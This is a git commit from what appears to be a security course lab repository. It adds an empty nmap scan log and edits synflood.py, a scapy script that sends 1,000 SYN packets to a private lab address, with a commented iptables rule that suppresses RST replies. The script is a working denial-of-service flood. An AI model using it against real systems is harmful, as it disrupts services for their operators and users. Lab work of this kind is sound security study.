d058c072212514ea9497c43fe8baac14e71bb5f2
trevor <trevor>
2023-04-09 15:25:11 +0000

    13337_seq=i

---
+++ week4/flagit.cse543.rev.fish
@@ -0,0 +1,3 @@
+# Nmap 7.60 scan initiated Sun Apr  9 15:21:24 2023 as: nmap -o flagit.cse543.rev.fish
+WARNING: No targets were specified, so 0 hosts scanned.
+# Nmap done at Sun Apr  9 15:21:24 2023 -- 0 IP addresses (0 hosts up) scanned in 0.03 seconds
--- week4/synflood.py
+++ week4/synflood.py
@@ -2,15 +2,17 @@ from scapy.all import *
 #iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.16.44.21 -j DROP
 #https://stackoverflow.com/questions/9058052/unwanted-rst-tcp-packet-with-scapy
 
-_port=80
-ports = [80,13337]
+_port=13337
 _server="172.16.44.1"
 _payload="hello"
 
 
-for i in range(0,20):    
-    dport=ports[i%2]
-    S = IP( dst=_server)/TCP(dport=dport,flags='S')
-    ans = sr1(S)
+S = IP( dst=_server)/TCP(dport=_port,flags='S', seq=1)
+send(S, count=1000)
+
+# for i in range(0,1000):    
+#     dport=_port
+#     S = IP( dst=_server)/TCP(dport=dport,flags='S', seq=1)
+#     ans = sr1(S)
 
 
